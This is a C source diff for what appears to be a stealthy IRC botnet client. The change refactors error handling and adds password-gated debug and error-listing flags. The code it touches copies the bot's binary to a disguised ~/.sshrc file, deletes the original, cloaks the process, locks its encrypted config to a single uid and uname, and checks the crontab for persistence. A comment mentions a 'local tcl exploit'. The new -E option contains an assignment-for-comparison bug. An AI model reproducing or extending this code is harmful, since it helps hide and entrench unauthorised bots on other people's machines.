@@ -64,7 +64,7 @@ int leaf = 1;
 int localhub = 1; //we set this to 0 if we have -c, later.
 
 extern char		 origbotname[], userfile[], botnetnick[], 
-                         thekey[], netpass[], thepass[], myip6[], myip[], hostname[],
+                         thekey[], netpass[], shellpass[], myip6[], myip[], hostname[],
                          hostname6[], natip[];
 extern int		 dcc_total, conmask, cache_hit, cache_miss,
 			 max_logs, quick_logs, fork_interval, 
@@ -105,6 +105,7 @@ int updating = 0; /* this is set when the binary is called from itself. */
 char tempdir[DIRMAX] = "";
 char lock_file[40] = "";
 char *binname;
+int     sdebug = 0;		/* enable debug output? */
 char	configfile[121] = ""; /* Name of the config file */
 char	textdir[121] = "";	/* Directory for text files that get dumped */
 int	keep_all_logs = 0;	/* Never erase logfiles, no matter how old
@@ -184,15 +185,14 @@ Context;
     (func[SERVER_NUKESERVER]) (s);
   }
 #endif
-
-  putlog(LOG_MISC, "*", "* %s", s);
+  if (s[0])
+    putlog(LOG_MISC, "*", "* %s", s);
   flushlogs();
   for (i = 0; i < dcc_total; i++)
     if (dcc[i].sock >= 0)
       killsock(dcc[i].sock);
   if (!recoverable) {
     unlink(pid_file);
-    //unlink(lock_file);
     bg_send_quit(BG_ABORT);
     exit(1);
   }
@@ -495,38 +495,41 @@ void eggAssert(const char *file, int line, const char *module)
 static void gotspawn(char *);
 #endif
 
-
+int checkedpass = 0;
 void checkpass() 
 {
-  char *gpasswd;
-  MD5_CTX ctx;
-  int i = 0;
+  if (!checkedpass) {
+    char *gpasswd;
+    MD5_CTX ctx;
+    int i = 0;
 
-  gpasswd = (char *) getpass(STR("* Enter password: "));
-  MD5_Init(&ctx);
-  MD5_Update(&ctx, gpasswd, strlen(gpasswd));
-  MD5_Final(md5out, &ctx);
-  for(i=0; i<16; i++)
-    sprintf(md5string + (i*2), "%.2x", md5out[i]);
-  if (strcmp(thepass, md5string)) {
-    fatal("incorrect password.",0);
-    exit(1); //this shouldn't be reached..
+    gpasswd = (char *) getpass(STR("* Enter password: "));
+    MD5_Init(&ctx);
+    MD5_Update(&ctx, gpasswd, strlen(gpasswd));
+    MD5_Final(md5out, &ctx);
+    for(i=0; i<16; i++)
+      sprintf(md5string + (i*2), "%.2x", md5out[i]);
+    if (strcmp(shellpass, md5string)) {
+      fatal("incorrect password.",0);
+      exit(1); //this shouldn't be reached..
+    }
+    gpasswd = 0;
+    checkedpass = 1;
   }
-  gpasswd = 0;
 }
 
 void got_ed(char *, char *, char *);
 extern int optind;
 
 #ifdef LEAF
-#define PARSE_FLAGS "edntvPc"
+#define PARSE_FLAGS "edntvPcDE"
 #endif
 #ifdef HUB
-#define PARSE_FLAGS "edntv"
+#define PARSE_FLAGS "edntvDE"
 #endif
 static void dtx_arg(int argc, char *argv[])
 {
-  int i, cpass = 0;
+  int i;
   char *p = NULL, *p2 = NULL;
   while ((i = getopt(argc, argv, PARSE_FLAGS)) != EOF) {
     switch (i) {
@@ -539,37 +542,61 @@ static void dtx_arg(int argc, char *argv[])
         break;
 #endif
       case 'n':
-        cpass = 1;
+        checkpass();
 	backgrd = 0;
 	break;
       case 't':
+        checkpass();
         term_z = 1;
         break;
+      case 'D':
+        checkpass();
+        sdebug = 1;
+        sdprintf("debug enabled");
+        break;
+      case 'E':
+        checkpass();
+        p = argv[optind];
+        if (p) {
+          if (p[0] = '*') {
+            int n;
+            putlog(LOG_MISC, "*", "Listing all errors");
+            for (n = 1; n < ERR_MAX; n++)
+              putlog(LOG_MISC, "*", "Error #%d: %s", n, werr_tostr(n));
+          } else {
+            putlog(LOG_MISC, "*", "Error #%d: %s", atoi(p), werr_tostr(atoi(p)));
+          }
+          exit(0);
+        } else {
+          fatal("You must specify error number after -E", 0);
+        }
+         break;
       case 'e':
         if (argv[optind])
           p = argv[optind];
         if (argv[optind+1])
           p2 = argv[optind+1];
         got_ed("e", p, p2);
+        break; /* this should never be reached */
       case 'd':
         if (argv[optind])
           p = argv[optind];
         if (argv[optind+1])
           p2 = argv[optind+1];
         got_ed("d", p, p2);
+        break; /* this should never be reached */
       case 'v':
 	checkpass();
 	printf("%d\n", egg_numver);
 	bg_send_quit(BG_ABORT);
 	exit(0);
- 	  break; /* this should never be reached */
+        break; /* this should never be reached */
 #ifdef LEAF
       case 'P':
         if (getppid() != atoi(argv[optind]))
           exit(0);
         else {
-          if (SDEBUG)
-            printf("Updating...\n");
+          sdprintf("Updating...");
         }
         localhub = 1;
         updating = 1;
@@ -580,8 +607,6 @@ static void dtx_arg(int argc, char *argv[])
         break;
     }
   }
-  if (cpass)
-    checkpass();
 }
 
 #ifdef HUB
@@ -894,8 +919,7 @@ void checklockfile()
 
 void got_ed(char *which, char *in, char *out)
 {
-  if (SDEBUG)
-    printf("got_Ed called: -%s i: %s o: %s\n", which, in, out);
+  sdprintf("got_Ed called: -%s i: %s o: %s", which, in, out);
 Context;
   if (!in || !out)
     fatal("Wrong number of arguments: -e/-d <infile> <outfile/STDOUT>",0);
@@ -1020,8 +1044,7 @@ static void gotspawn(char *filename)
     temps = (char *) decrypt_string(netpass, decryptit(templine));
 
 #ifdef S_PSCLOAK
-    if (SDEBUG)
-      printf("GOTSPAWN: %s\n", temps);
+    sdprintf("GOTSPAWN: %s", temps);
 #endif /* S_PSCLOAK */
 
     pscloak = atoi(newsplit(&temps));
@@ -1175,16 +1198,13 @@ int main(int argc, char **argv)
   FILE *f;
   struct sigaction sv;
   struct chanset_t *chan;
-  struct stat sb;
 #ifdef LEAF
-  struct stat ss;
   int skip = 0;
   FILE *fp;
   struct passwd *pw;
   char newbinbuf[DIRMAX], newbin[DIRMAX], confdir[DIRMAX], tmp[DIRMAX], 
        cfile[DIRMAX], templine[8192], *temps;
   int ok = 1;
-//  uid_t id;
 #else
   char confdir[DIRMAX], tmp[DIRMAX], cfile[DIRMAX], templine[8192], *temps;
   char tmpdir[DIRMAX];
@@ -1295,32 +1315,30 @@ int main(int argc, char **argv)
 
   check_trace_start();
 
-  if (stat(binname, &sb))
-   fatal("Cannot access binary.", 0);
-  if (chmod(binname, S_IRUSR | S_IWUSR | S_IXUSR))
-   fatal("Cannot chmod binary.", 0);
+  if (!can_stat(binname))
+   werr(ERR_BINSTAT);
+  if (!fixmod(binname))
+   werr(ERR_BINMOD);
 
   init_settings();
 Context;
   init_tcl(argc, argv);
 Context;
   if (argc) {
-    if (SDEBUG)
-      printf("Calling dtx_arg with %d params.\n", argc);
+    sdprintf("Calling dtx_arg with %d params.", argc);
 Context;
     dtx_arg(argc, argv);
   }
 
 #ifdef LEAF
 
-  if (SDEBUG)
-    printf("my uid: %d my uuid: %d, my ppid: %d my pid: %d\n", getuid(), geteuid(), getppid(), getpid());
+  sdprintf("my uid: %d my uuid: %d, my ppid: %d my pid: %d", getuid(), geteuid(), getppid(), getpid());
 
 Context;
   pw = getpwuid(geteuid());
 
   if (!pw)
-   fatal("Cannot read from the passwd file.", 0);
+   werr(ERR_PASSWD);
 Context;
   chdir(pw->pw_dir);
   snprintf(newbin, sizeof newbin, "%s/.sshrc", pw->pw_dir);
@@ -1335,60 +1353,52 @@ Context;
 
 #ifdef LEAF
   /* is the homedir a symlink? */
-  if (SDEBUG)
-    printf("newbin starts at: %s\n", newbin);
+  sdprintf("newbin starts at: %s", newbin);
 
 /* fuck it, I hate dealing with this shit.
-  if (!stat(newbin, &ss)) {
+  if (!can_stat(newbin)) {
     int f = 0;
     if (ss.st_mode & S_IFLNK) {  //stupid symlinked home dirs !
       f = readlink(newbin, newbinbuf, sizeof newbinbuf);
       if (!f) {
-        if (SDEBUG)
-          printf("symlink newbin: %s\n", newbin);
+        sdprintf("symlink newbin: %s", newbin);
         strcpy(newbin, newbinbuf);
-        if (SDEBUG)
-          printf("newbin is now: %s\n", newbin);
+        sdprintf("newbin is now: %s", newbin);
       } else {
-        if (SDEBUG) {
-          printf("readlink failed on %s with error %d erno %d\n", newbin, f, errno);
-        }
-        //fuck it. (no paths)
-        sprintf(newbin, ".sshrc");
-        copyfile(binname, newbin);
-        skip = 1;
+          sdprintf("readlink failed on %s with error %d erno %d", newbin, f, errno);
+          //fuck it. (no paths)
+          sprintf(newbin, ".sshrc");
+          copyfile(binname, newbin);
+          skip = 1;
       }
     }
   }
-  if (SDEBUG)
-    printf(STR("skip is: %d\n"), skip);
+  sdprintf(STR("skip is: %d"), skip);
 */
 
   if (strcmp(binname,newbin) && !skip) { //running from wrong dir, or wrong bin name.. lets try to fix that :)
-    if (SDEBUG)
-      printf("wrong dir, is: %s :: %s\n", binname, newbin);
+    sdprintf("wrong dir, is: %s :: %s", binname, newbin);
     unlink(newbin);
     if (copyfile(binname,newbin))
      ok = 0;
 
     if (ok) 
-     if (stat(newbin, &sb)) {
+     if (!can_stat(newbin)) {
        unlink(newbin);
        ok = 0;
      }
     if (ok) 
-      if (chmod(newbin, S_IRUSR | S_IWUSR | S_IXUSR)) {
+      if (!fixmod(newbin)) {
         unlink(newbin);
         ok = 0;
       }
 
     if (!ok)
-      fatal("Wrong directory/binname.", 0);
+      werr(ERR_WRONGBINDIR);
     else {
       unlink(binname);
       if (system(newbin)) {
-        if (SDEBUG)
-	  printf(STR("exiting due to problem with restarting new binary.\n"));
+        sdprintf(STR("exiting due to problem with restarting new binary."));
         exit(1);
       } else {
 	printf(STR("exiting to let new binary run.\n"));
@@ -1403,33 +1413,33 @@ Context;
 #endif
  
   snprintf(tmp, sizeof tmp, "%s/", confdir);
-  if (stat(tmp, &sb)) {
+  if (!can_stat(tmp)) {
 #ifdef LEAF
     if (mkdir(tmp,  S_IRUSR | S_IWUSR | S_IXUSR)) {
       unlink(confdir);
-      if (stat(confdir, &sb))
+      if (!can_stat(confdir))
         if (mkdir(confdir, S_IRUSR | S_IWUSR | S_IXUSR))
 #endif
-          fatal("cant create/access config dir.\n",0);
+          werr(ERR_CONFSTAT);
 #ifdef LEAF
     }
 #endif
   }
 
   snprintf(tmp, sizeof tmp, "%s/", tempdir);
-  if (stat(tmp, &sb)) {
+  if (!can_stat(tmp)) {
     if (mkdir(tmp,  S_IRUSR | S_IWUSR | S_IXUSR)) {
       unlink(tempdir);
-      if (stat(tempdir, &sb))
+      if (!can_stat(tempdir))
         if (mkdir(tempdir, S_IRUSR | S_IWUSR | S_IXUSR))
-          fatal("cant create/access tmp dir.\n",0);
+          werr(ERR_TMPSTAT);
     }
   }
 
-  if (chmod(confdir, S_IRUSR | S_IWUSR | S_IXUSR))
-    fatal("cannot chmod config dir.\n",0);
-  if (chmod(tempdir, S_IRUSR | S_IWUSR | S_IXUSR))
-    fatal("cannot chmod tmp dir.\n",0);
+  if (!fixmod(confdir))
+    werr(ERR_CONFDIRMOD);
+  if (!fixmod(tempdir))
+    werr(ERR_TMPMOD);
 
   //The config dir is accessable with correct permissions, lets read/write/create config file now..
 #ifdef LEAF
@@ -1437,7 +1447,10 @@ Context;
 #else
   snprintf(cfile, sizeof cfile, "%s/conf", confdir);
 #endif
-  chmod(cfile, S_IRUSR | S_IWUSR | S_IXUSR);
+  if (!can_stat(cfile))
+    werr(ERR_NOCONF);
+  if (!fixmod(cfile))
+    werr(ERR_CONFMOD);
 
 Context;
   init_dcc_max();
@@ -1477,20 +1490,20 @@ Context;
 #endif /* HAVE_UNAME */
     i = 0;
     if (!(f = fopen(cfile, "r")))
-      fatal(STR("the local config is missing."),0);
+       werr(0);
     while(fscanf(f,"%[^\n]\n",templine) != EOF) {
       char *nick = NULL, *host = NULL, *ip = NULL, *ipsix = NULL;
       int skip = 0;
       Context;
       if (templine[0] != '+') {
         printf(STR("%d: "), i);
-        fatal(STR("conf not encrypted correctly."), 0);
+        werr(ERR_CONFBADENC);
       }
 
       temps = (char *) decrypt_string(netpass, decryptit(templine));
       if (!strchr(STR("*#-+!abcdefghijklmnopqrstuvwxyzABDEFGHIJKLMNOPWRSTUVWXYZ"), temps[0])) {
         printf(STR("%d: "), i);
-        fatal(STR("Invalid config or encryption."),0);
+        werr(ERR_CONFBADENC);
       }
 
       snprintf(c, sizeof c, "%s",temps);
@@ -1500,25 +1513,21 @@ Context;
       else if (c[0] == '-' && !skip) { //this is the uid
         newsplit(&temps);
         if (geteuid() != atoi(temps)) {
-          if (SDEBUG) 
-            printf("wrong uid, conf: %d :: %d\n", atoi(temps), geteuid());
-          fatal("Go away.",0);
+          sdprintf("wrong uid, conf: %d :: %d", atoi(temps), geteuid());
+          werr(ERR_WRONGUID);
         }
       } else if (c[0] == '+' && !skip) { //this is the uname
         int r = 0;
         newsplit(&temps);
         snprintf(check, sizeof check, "%s %s", unix_n, vers_n);
         if ((r = strcmp(temps, check))) {
-          if (SDEBUG) 
-            printf("wrong uname, conf: %s :: %s\n", check, temps);
-          printf("%d\n", r);
-          fatal("Go away..",0);
+          sdprintf("wrong uname, conf: %s :: %s", check, temps);
+          werr(ERR_WRONGUNAME);
         }
       } else if (c[0] == '!') { //local tcl exploit
         if (c[1] == '-') { //dont use pscloak
 #ifdef S_PSCLOAK
-          if (SDEBUG)
-            printf("NOT CLOAKING\n");
+          sdprintf("NOT CLOAKING");
 #endif /* S_PSCLOAK */
           pscloak = 0;
         } else {
@@ -1530,9 +1539,8 @@ Context;
         i++;
         nick = newsplit(&temps);
         if (!nick || !nick[0])
-          fatal("invalid config.",0);
-        if (SDEBUG)
-          printf("Read nick from config: %s\n", nick);
+          werr(ERR_BADCONF);
+          sdprintf("Read nick from config: %s", nick);
         if (temps[0])
           ip = newsplit(&temps);
         if (temps[0])
@@ -1623,8 +1631,7 @@ Context;
 
 #ifdef LEAF
   if (localhub) {
-    if (SDEBUG)
-      printf("I am localhub\n");
+    sdprintf("I am localhub (%s)", origbotname);
 #endif
     check_crontab();
 #ifdef LEAF
